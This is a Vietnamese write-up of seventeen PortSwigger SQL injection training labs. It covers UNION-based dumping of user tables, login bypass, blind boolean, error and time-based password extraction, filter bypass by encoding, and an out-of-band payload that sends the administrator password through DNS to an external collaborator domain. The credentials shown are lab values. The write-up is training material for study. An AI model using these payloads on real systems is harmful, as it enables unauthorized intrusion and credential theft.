# SQL INJECTION WRITEUP
***
## Lab 1:  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![image](https://i.imgur.com/jrExZD1.png)


- Lab này yêu cầu tôi thực hiện tấn công sql injection để hiển thị một hay nhiều sản phẩm chưa được phát hành
- Theo như để bài nơi tấn công injection là bộ lọc danh mục sản phẩm, do đó tôi sẽ sử dụng công cụ Burp Suite để bắt lấy request của category:
 ![image](https://i.imgur.com/ZbIaipo.png)


- Ta đưa nó vào repeater rồi chỉnh sửa request:
  + `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
    
cho thông tin phân loại theo tên category và released = 1
  + Đầu tiên, tôi thêm một kí tự sql đặc biệt dễ phá vỡ câu lệnh truy vấn, ở đây tôi thêm dấu ', thì ta nhận thu được lỗi **Internal Server Error**
     ![image](https://i.imgur.com/9YGn7nD.png)

  + Tiếp theo, tôi sẽ chèn thêm 1 phần tử luôn đúng ** 1 = 1 ** vào , khi đó câu lệnh Select * sẽ chọn hế tất cả sản phẩm từ bảng Products mà không cần quan tâm đến sự phân loại của category và sau đó ta sẽ sử dụng dấu -- để bỏ qua tất cả câu lệnh phía sau:
    ![image](https://i.imgur.com/6CwDqNn.png)

  Như vậy bài lab trên đã được giải quyết.
![image](https://i.imgur.com/M2aRTQ1.png)


## Lab 2: SQL injection vulnerability allowing login bypass

![image](https://i.imgur.com/m3NsgG2.png)


- Lab này yêu cầu tôi thực hiện tấn công sql injection để đăng nhập vào ứng dụng với tài khoản administrator
- Vì nó là chức năng đăng nhập nên câu lệnh truy vấn sql của nó là một cái gì đó tương tự câu lệnh truy vấn

  `SELECT FIRSTNAME FROM USERS WHERE USER = 'ADMINISTRATOR' AND PASSWORD = 'PASSWORD'`

- Vì đề bài yêu cầu đăng nhập với tư cách administrator nên tôi sẽ thực hiện tấn công sql injection vào tài khoản : `administrator'--`

Ở đây câu lệnh truy vấn sql sẽ tương tự 

`SELECT FIRSTNAME FROM USER WHERE USER = 'ADMISTRATOR'`

nó sẽ đăng nhậo vào tài khoản administrator và tự động bỏ qua trường mật khẩu
![image](https://i.imgur.com/uIc0prc.png)


Như vậy bài lab đã được giải quyết
![image](https://i.imgur.com/dmKbPdf.png)

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query
![image](https://i.imgur.com/UyWZRmt.png)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category, và kết quả truy vấn sẽ được trả về trong phản hồi của ứng dụng. Vì vậy tôi có thể sử dụng tấn công UNION để truy xuất dữ liệu từ các bảng khác.
- Mục tiêu của bài lab này là xác định số lượng cột được truy vấn trả về vì vậy tôi sẽ dùng kiểu tấn công union để xác định số cột

  `select ? from table1 union select null`
- Ở đây, table 1 là bảng tôi cần xác định số cột, vì chưa biết số cột là bao nhiêu nên tôi sẽ để nó là ?, tôi sẽ thêm lần lượt các giá trị NULL. Nếu số cột không đúng nó sẽ báo lỗi, ngược lại số cột table1 trùng với số giá trị NULL thì chúng ta sẽ xác định được số cột của bảng table1
- Đầu tiên, tôi sẽ dùng công cụ burp suite đưa filter category vào repeater
![image](https://i.imgur.com/3MuSBGy.png)
- Tiếp theo tôi sẽ thêm phần tham số của filter?category=Gifts là: '+union+select+null--
  + Với dấu ' là để ngắt input vào tham số accesories, UNION SELECT để khởi tạo UNION và thêm 1 số NULL, đồng thời chú thích để ngắt những câu lệnh đằng sau: 
![image](https://i.imgur.com/PGtYIyE.png)
- Tôi thu được kết quả là lỗi server: `Internal Server Error`, điều đó chứng tỏ số cột của table1 không phải là 1, tôi tiếp tục thêm null vào cho đến giá trị null thứ 3 thì câu lệnh query trả về 3 giá trị của bảng table1
![image](https://i.imgur.com/x5hgX4h.png)

Như vậy, tôi biết được số cột cần tìm là 3 và bài lab đã được giải quyết

## Lab 4: SQL injection UNION attack, finding a column containing text  
![image](https://i.imgur.com/ZZDU3bT.png)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của lab này là tìm ra cột có kiểu dữ liệu là string trong query trả về
- Đầu tiên, bằng kỹ thuật của lab trước ta xác định được số cột trả về của câu lệnh query là 3
![image](https://i.imgur.com/M7cPStO.png)
- Tiếp theo ta thay lần lượt các giá trị null bằng 1 chuỗi có kiểu dữ liệu là string để xác định cột nào trong query trả về là string
![image](https://i.imgur.com/LGqbGrN.png)
![image](https://i.imgur.com/d05BywU.png)
![image](https://i.imgur.com/1hIC29z.png)

Như vậy sau ba lần thử ta thu được kiểu dữ liệu ở cột 2 là string

## Lab 5: SQL injection UNION attack, retrieving data from other tables

![image](https://i.imgur.com/iwJoQTa.png)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu: truy xuất tất cả username và password, đồng thời sử dụng thông tin để đăng nhập với tư cách administrator.
- Đầu tiên ta sẽ xác định số cột trả về của query:
![image](https://i.imgur.com/H5EzVYG.png)
- Ta thu được số cột là 2, tiếp theo ta sẽ kiểm tra cột nào có kiểu dữ liệu là string trong query:
![image](https://i.imgur.com/24pHeRd.png)
- Sau khi thu được kết quả là cả 2 cột của query đều là kiểu dữ liệu string, ta tiến hành lấy username và password của bảng users bằng câu lệnh:

  `UNION SELECT username, password FROM users`

![image](https://i.imgur.com/T9tobWW.png)
![image](https://i.imgur.com/HICqkXD.png)

- Ta thu được 3 tài khoản:
  + Username: carlos password: pvgpp9o6trxpr93ahccn
  + Username: wiener password: wbdwdd8pkp9lt5umm54o
  + Username: administrator password: 0qr272qw91l66n6acds8
![image](https://i.imgur.com/LmQ86UH.png)

## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column
![image](https://i.imgur.com/t2Iq3aO.png)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu: truy xuất tất cả username và password, đồng thời sử dụng thông tin để đăng nhập với tư cách administrator.
- Đầu tiên ta sẽ xác định số cột trả về của query:
![image](https://i.imgur.com/AGBMLyt.png)
- Ta thu được số cột là 2, tiếp theo ta sẽ kiểm tra cột nào có kiểu dữ liệu là string trong query:
![image](https://i.imgur.com/0eMX6oI.png)
![image](https://i.imgur.com/FdRx9Uj.png)
- Vật là sau 2 lần thử ta biết được kiểu dữ liệu của cột 2 trong câu lệnh query là kiểu dữ liệu string
- Tiếp theo ta tiến hành lấy thông tin username và password của bảng users:
   + Ở đây đề bài có gợi ý chúng ta tham khảo *[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)* , ta biết được cách nối các chuỗi:
![image](https://i.imgur.com/iKHsYX7.png)
  + Việc tiếp theo chúng ta cần làm là đi xác định xem loại database mà lab đang sử dụng là gì:
![image](https://i.imgur.com/hEZoXmC.png)
![image](https://i.imgur.com/oam6oyn.png)
  + May mắn là sau 2 lần thử ta tìm được loại database đang sử dụng là: PostgreSQL. Vì vậy ta sử dụng câu lệnh `UNION SELECT null, username||'*'||password from users` để lấy ra thông tin tài khoản và mật khẩu của bảng users và dùng kí tự '*' để phân cách username và password:
![image](https://i.imgur.com/MdMmgGd.png)
  + Vậy là ta thu được thông tin username và password của bảng users: 
    + Username: carlos password: ef4ueznxivablyhn7p7g
    + Username: wiener password: q64ty8g7wdo6h3afmkip
    + Username: administrator password: eqgfgcq6tbnetyg4r3cl
![image](https://i.imgur.com/sP7p66G.png)

## Lab 7: SQL injection attack, querying the database type and version on Oracle

![image](https://i.imgur.com/b4isqrv.png)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab trên hiển thị chuỗi phiên bản của database
- Ở đây đề bài có gợi ý chúng ta tham khảo *[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)*, từ đó ta biết được cách xác định phiên bản của database bằng cách sau:
![image](https://i.imgur.com/uIrKxmX.png)
- Đầu tiên ta sẽ xác định số cột của kết quả query trả về. Trên cơ sở dữ liệu Oracle, mọi câu lệnh SELECT phải chỉ định một bảng để chọn FROM. Nếu cuộc tấn công UNION SELECT của bạn không truy vấn từ một bảng, bạn vẫn cần bao gồm từ khóa FROM theo sau là tên bảng hợp lệ. Có một bảng tích hợp sẵn trên Oracle có tên là *dual* mà bạn có thể sử dụng cho mục đích này nên ta sẽ sử dụng `UNION SELCT null FROM DUAL` để xác định số cột của query:
![image](https://i.imgur.com/hqQHUQm.png)
- Từ đó ta xác định được số cột là 2, tiếp theo ta sẽ xem xét 2 cột trả về cột nào sẽ trả về kiểu dữ liệu là string
![image](https://i.imgur.com/28fsBt6.png)
![image](https://i.imgur.com/1DQSI4x.png)

- Chúng ta biết được 2 cột đều mang giá trị string nên ta có thể trỏ câu lệnh`SELECT banner FROM v$version` vào bất kỳ cột nào để xác định phiên bản của database, ở đây ta sẽ chọn cột 1
![image](https://i.imgur.com/Sy32r6r.png)
- Như vậy ta biết được phiên bản của database là: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

## Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft
![image](https://i.imgur.com/xlex3Et.png)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này hiển thị chuỗi phiên bản của database
- Tương tự như lab trước, ta cũng sẽ đi xác định số cột và kiểu dữ liệu của cột nào trả về là string
![image](https://i.imgur.com/0dujW3p.png)
![image](https://i.imgur.com/jjyfY0H.png)
- Ta xác định được số cột là 2 và cột 1 trả về kiểu dữ liệu string, tiếp theo ta sẽ dụng câu lệnh `UNION SELECT @@version, null` để xác định phiên bản database của trang web
![image](https://i.imgur.com/zk5ni8T.png)

## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases

![image](https://i.imgur.com/ydrgzbA.png)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này là xác định tên của bảng này và các cột chứa trong đó, sau đó truy xuất nội dung của bảng để lấy username và password của tất cả người dùng. Cuối cùng đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ xác định số cột và xem cột nào có kiểu dữ liệu là string:
![image](https://i.imgur.com/nsv9BwA.png)
![image](https://i.imgur.com/qTuYkiD.png)
- Ta thu được số cột của query là 2 và 2 cột đều có kiểu dữ liệu là string, tiếp theo ta sẽ đi xác định loại database mà web đang sử dụng và phiên bản của nó :
![image](https://i.imgur.com/vYhlalD.png)
- Ta biết được loại database ở đây là PostgreSQL từ đó ta có thể liệt kê các bảng trong database và các cột trong bảng:
![image](https://i.imgur.com/7HRLKfy.png)
![image](https://i.imgur.com/cSP3gmH.png)

- Để lấy tên các bảng trong databaseta sử dụng câu lệnh `UNION SELECT table_name,null FROM information_schema.tables`
![image](https://i.imgur.com/4lCV5fD.png)
- Sau khi đã có được các bảng trong database ta tìm được 1 bảng chưa các thông tin người dùng là *users_yvfjdr*. Sau đó, ta sẽ tiếp tục tìm các cột có chưa thông tin username và password trong bảng users_yvfjdr
`UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_yvfjdr'
![image](https://i.imgur.com/oFyR1TI.png)
![image](https://i.imgur.com/Yiopgmx.png)
- May mắn là ta tìm được 2 cột có tên là *username_esaqfd* và *password_xwykge*. Từ đó ta sẽ đi truy xuất username và password của bảng *users_yvfjdr*
![image](https://i.imgur.com/vdegaU1.png)
- Ta thu được password của administrator là: 2xhmclqcj65zlzpyfitm
![image](https://i.imgur.com/ceJPRMZ.png)

## Lab 10: SQL injection attack, listing the database contents on Oracle
     
![image](https://i.imgur.com/pA9IeMB.png)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này là xác định tên của bảng này và các cột chứa trong đó, sau đó truy xuất nội dung của bảng để lấy username và password của tất cả người dùng. Cuối cùng đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ xác định số cột và xem cột nào có kiểu dữ liệu là string:
![image](https://i.imgur.com/A4NYNbP.png)
- Ta thu được số cột trả về là 2 và kiểu dữ liệu của 2 cột đều là string. Theo như thông tin bài lab đã cho database ở đây là oracle, do đó ta sẽ dùng câu lệnh:
  `UNION SELECT table_name,null  FROM all_tables` để truy xuất ra các bảng có trong database
![image](https://i.imgur.com/ubeWNeO.png)
- Ta nhận được 1 bảng có tên là *USERS_SCKKOA*. Ta sẽ tiếp tục tìm kiếm thông tin username và password ở bảng *USERS_SCKKOA*:
`UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_SCKKOA'`
![image](https://i.imgur.com/85r4GmK.png)
- Ta nhận được 2 cột có tên là *USERNAME_ZAUSII* và *PASSWORD_ALYSRA*, tiếp theo ta sẽ đi tiến hành lấy thông tin username và password của các tài khoản trong bảng *USERS_SCKKOA* dựa vào 2 cột trên
![image](https://i.imgur.com/OmhIUGw.png)

- Như vậy ta tìm được 3 tài khoản với username và password là:
  + Username: administrator password: ext4fzchddhsfh0l4wpm
  + Username: carlos password: edku7zejid7cwkz61z7j
  + Username: wiener password: sboskqqp4ru444ebfl5d
![image](https://i.imgur.com/QS7lhwU.png)

## Lab 11: Blind SQL injection with conditional responses

![image](https://i.imgur.com/HcvAoo9.png)
- Lab này có chứa lỗ hổng Blind SQL Injection, Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Tuy nhiên, ứng dụng sẽ bao gồm thông báo "Welcome back" trong trang nếu truy vấn trả về bất kỳ hàng nào.
- Theo như dữ liệu của bài lab chúng ta có một bảng trong database là users và 2 cột là username và password. Mục tiêu của bài lab này là khai thác lỗ hổng blind sql injection để tìm ra được password của tài khoản administrator và đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ chèn vào trang web câu truy vấn luôn đúng và câu lệnh luôn sai để xem phản ứng của trang web
 ![image](https://i.imgur.com/SjqMbs3.png)
 ![image](https://i.imgur.com/lTyv6ex.png)

- Ta nhận thấy khi chèn vào trang web câu 1 câu truy vấn, nó sẽ trả về *Welcome back* nếu  câu truy vấn đó là đúng và không phản hồi lại gì nếu nó là sai. Ta biết được username là *administrator*, bây giờ ta cần đi kiểm tra độ dài của mật khẩu bằng câu lệnh :

  `and (Select 'a' from users where username = 'administrator' and length(password) = $X) = 'a'`

  Trong đó X là độ dài của mật khẩu. Ở đây ta sẽ dùng tab intruder để bruteforce, attack type *sniper* cho kiểm tra độ dài mật khẩu tử 1 đến 50:
  ![image](https://i.imgur.com/vcaFcm9.png)

  - Như vậy ta tìm được độ dài của mật khẩu là: 20. Tiếp theo ta sẽ đi dò từng ký tự của mật khẩu bằng câu truy vấn:

    `and (select substring(password,$x, 1) from user where username='administrator')='$y'`

    Trong đó $x là vị trí con xâu chạy từ 1 đén 20 và $y là vị trí thử các ký tự của mật khẩu từ a-z và 0-9. Ta chọn mode ClusterBomb và bắt đầu bruteforce:
    ![image](https://i.imgur.com/sSR9NVr.png)
    ![image](https://i.imgur.com/Njzs7My.png)
  - Sau khi tìm kiếm các trường hợp trở về *Welcome back* của các ký tự đúng trong password ta thu được password: ndsh14qof5am5f4n40yh
    ![image](https://i.imgur.com/NAM5QXu.png)


## Lab 12: Blind SQL injection with conditional errors

![image](https://i.imgur.com/rh6cSGg.png)

- Lab này có chứa lỗ hổng Blind SQL Injection, Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Nhưng bất kỳ câu lệnh nào không được thực thi thì chương trình sẽ báo lỗi.

- Theo như dữ liệu của bài lab chúng ta có một bảng trong database là users và 2 cột là username và password. Mục tiêu của bài lab này là khai thác lỗ hổng blind sql injection để tìm ra được password của tài khoản administrator và đăng nhập với tư cách là administrator
- Đầu tiên, ta sửa đổi cookie TrackingId, thêm một dấu ' vào nó
 ![image](https://i.imgur.com/opLlG7u.png)

ta nhận được status 500 thông báo lỗi. Nhưng khi ta thêm 1 dấu ' để  đóng trích dẫn thì lỗi đó biến mất

![image](https://i.imgur.com/gsqArFO.png)

- Tiếp theo ta sẽ đi kiểm tra xem loại database của trang wed đang sử dụng là gì thì ta biết được nó là orcle vì nó yêu cầu mệnh đề From để truy vấn
  ![image](https://i.imgur.com/AKAvWOR.png)
- Sau đó ta sẽ đi tìm độ dài mật khẩu của tài khoản administrator bằng cách nối thêm câu truy vấn:

  `|| (Select case when length(password) = $x then to_char(1/0) else '' end from users where username='administrator')||`

Trong đó $x là độ dài của mật khẩu nếu độ dài mật khẩu bằng $x thì trang web nó sẽ báo lỗi(status 500) vì nếu nó đúng nó sẽ thực hiện phép tính 1/0 và gặp lỗi, ngược lại trang web sẽ phản hồi lại status là 200. Ta sữ dụng tab intruder chọn attack type là sniper và bắt đầu dò tìm độ dài mật khẩu

![image](https://i.imgur.com/gYe1O3N.png)

- Như vậy ta biết được độ dài của mật khẩu là 20, ta tiếp tiếp tục đi dò tìm các ký tự của mật khẩu bằng câu lệnh

  `|| (Select case when substr(password,$x,1) = '$a' then to_char(1/0) else '' end from users where username='administrator')||`

  Trong đó $x là các vị trí từ 1-20 của mật khẩu , $a là các trường hợp thử của các ký tự:

  ![image](https://i.imgur.com/k0uJ6Y2.png)
  
  Kết quả bruteforce ta có
  
  ![image](https://i.imgur.com/9zD4t2u.png)

 Vậy mật khẩu của administrator là: lq3wtceb2ap07jtb465i

 ![image](https://i.imgur.com/N60v6jD.png)


## Lab 13: Visible error-based SQL injection

![image](https://i.imgur.com/7H02bi9.png)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về. Database có một bảng là users và 2 cột là username và password
- Mục tiêu của lab này là: tìm cách rò rỉ mật khẩu cho người dùng administrator, sau đó đăng nhập vào tài khoản của họ.
- Đầu tiên ta sẽ thử thêm vào trang web câu truy vấn luôn sai và luôn đúng xem phản hồi của trang web
  
  ![image](https://i.imgur.com/1emQuqw.png)
  ![image](https://i.imgur.com/RT2TZgj.png)

Trang web đều trả về status 200, điều đó cho thấy điều kiện trong câu truy vấn là đúng hay sai đều không ảnh hưởng gì tới bài lab lần này. Bây giờ ta sử dụng hàm cast để chuyển dữ liệu String về int để khiến ứng dụng tạo ra thông báo lỗi có chứa một số dữ liệu được truy vấn trả về

![image](https://i.imgur.com/jGvii1m.png)

Trang web trả về lỗi khi chuyển username administrator về kiểu dữ liệu int, vậy là ta biết được username là administrator. Tiếp theo ta sẽ chuyển password về kiểu dữ liệu int để xem kết quả trả về của câu truy vấn: 

![image](https://i.imgur.com/sW4FZc1.png)

Vậy là ta nhận được password trả về là: clf4yocb5eecjf4j5qw4

![image](https://i.imgur.com/jqdyHFG.png)

# Lab 14: Blind SQL injection with time delays and information retrieval

![image](https://i.imgur.com/qrZKet1.png)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và ứng dụng không phản hồi theo bất kỳ cách nào khác nhau dựa trên việc truy vấn trả về bất kỳ hàng nào hay gây ra lỗi. Tuy nhiên, do truy vấn được thực hiện đồng bộ nên có thể kích hoạt độ trễ thời gian có điều kiện để suy ra thông tin. Database có một bảng là users và 2 cột là username và password
- Mục tiêu là tìmd được mật khẩu của administrator và đăng nhập vào
- Đầu tiên ta thử phản hồi của trang web khi thêm 1 câu truy vấn gây ra độ trễ thời gian

  `|| ( select case when (1=1) then pg_sleep(10) else pg_sleep(0) end) -- `

  ![image](https://i.imgur.com/0OBUaaO.png)

ta nhận được phản hồi trả về là hơn 10s vậy nên câu truy vấn tạo độ  trễ thời gian là hợp lệ. Bây giờ ta sẽ đi tìm độ dài của mật khẩu dựa vào câutruy vấn

`|| ( select case when (username='administrator' and length(password)=$x) then pg_sleep(10) else pg_sleep(0) end from users) -- `

trong đó $x là độ dài mật khẩu. Trang web sẽ phản hồi lớn hơn 10s khi ta có độ dài password là đúng. Ở đây ta sẽ dùng tab intruder, attack type là sniper để đi dò độ dài mật khẩu

![image](https://i.imgur.com/rNHVB8k.png)

ta nhận được độ dài password là 20. Bây giờ ta sẽ đi tìm từng ký tự của password bằng câu lệnh:

|| ( select case when (username='administrator' and substring(password,$x,1)='$y') then pg_sleep(10) else pg_sleep(0) end from users) --

trong đó $x là xâu vị trí của password, $y là các ký tự thử. Ở đây ta sẽ dùng attack type là cluster bomb và tiến hành brute force: 

![image](https://i.imgur.com/Mxi4YWg.png)

 ta thu được password là: xdd8vnz55znm4zpng1b0

 ![image](https://i.imgur.com/ssCKcwT.png)

## Lab 15: Blind SQL injection with out-of-band interaction

![image](https://i.imgur.com/YNC8psd.png)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi
- Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, ta có thể kích hoạt các tương tác ngoài băng tần với miền bên ngoài
- Mục tiêu: khai thác lỗ hổng SQL SQL để thực hiện tra cứu DNS
- Đầu tiên, ta truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu chứa cookie TrackingId.

![image](https://i.imgur.com/qN7gkBY.png)

- Tiếp theo, ta sẽ tiến hành đi tra cứu DNS, do ta chưa biết loại database trang wed sử dụng nên ta sẽ đi thử:
  ![image](https://i.imgur.com/iE5y4YE.png)

  ![image](https://i.imgur.com/cwK5TNf.png)

  May mắn trong lần thử đầu tiên ta đã biết được loại database của trang web là: Oracle và đa tra cứu DNS thành công

  ![image](https://i.imgur.com/koMwnGE.png)

## Lab 16: Blind SQL injection with out-of-band data exfiltration
![image](https://i.imgur.com/OKOPivi.png)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi
- Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, ta có thể kích hoạt các tương tác ngoài băng tần với miền bên ngoài.
- Database có chứa 1 bảng có tên là users và 2 cột có tên là username và password
- Mục tiêu: Tìm được password của tài khoản administrator và đăng nhập thành công
- Đầu tiên ta sẽ dùng burp suite professional để lấy được mã nguồn của trang web
  ![image](https://i.imgur.com/uNHUwwn.png)

tiếp theo ta khiến cơ sở dữ liệu thực hiện tra cứu DNS sang miền bên ngoài chứa kết quả của truy vấn được chèn bằng câu lệnh truy vấn:

![image](https://i.imgur.com/bWAcES9.png)

'|| SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mrhynhbcjcn0lxym0b9ygnaspjv9jy.oastify.com/"> %remote;]>'),'/l') FROM dual--'

![image](https://i.imgur.com/ZznXfb3.png)

Như vậy password đã được thêm vào và nối với DNS: 3tq5aky1wnf0l0d34iwz

![image](https://i.imgur.com/rfAQ8FI.png)

Như vậy bài lab đã được giải quyết

## Lab 17: SQL injection with filter bypass via XML encoding

![image](https://i.imgur.com/yynL3bX.png)

- Lab trên chứa một lỗ hổng SQL Injection ở tính năng kiểm tra hàng hóa. Database có 1 bảng là users và có 2 cột là username và password
- Nhiệm vụ của ta là phải lấy được thông tin từ bảng users, từ đó lấy được tài khoản và mật khẩu của administrator.
- Đầu tiên,ta có thể xác định số cột của query trả về bằng câu truy vấn `UNION SELECT NULL` thì ta nhận được phản hồi lỗi 403 Forbidden

  ![image](https://i.imgur.com/s78FZkb.png)

  Như vậy trang web đã phát hiện bị tấn công, ta hông thể tấn công theo cách bình thường như này, nên em cần phải sử dụng thêm extension có trong BurpSuite là Hackvertor, công cụ này sẽ biến đổi payload và mã hóa theo nhiều dạng khác nhau, tiêu biểu như: base64, base32, hex..,  Ở đây ta sẽ encode câu query theo dạng hex_entities để cố gắng vượt qua tường lửa của trang web
 ![image](https://i.imgur.com/fhXKK8H.png)

 ![image](https://i.imgur.com/MnvkkmD.png)

Ta thấy ở đây số cột được trả về là 1, từ đó ta sẽ tiến hành truy vấn username và password từ cột đó bằng câu lệnh

`UNION SELECT username||'#'||password from users`

![image](https://i.imgur.com/H9leMpO.png)

Ta tìm được các username và password lần lượt là: 
 + username: wiener password: irntf3qcpqgfxf4vedso
 + username: administrator password: fm6ib02c2ojdqdji6xff
 + username: carlos password: t4hjnu7a2qcdgncqfpf4

![image](https://i.imgur.com/k0VYUDI.png)

Như vậy bài lab đã được giải quyết

  
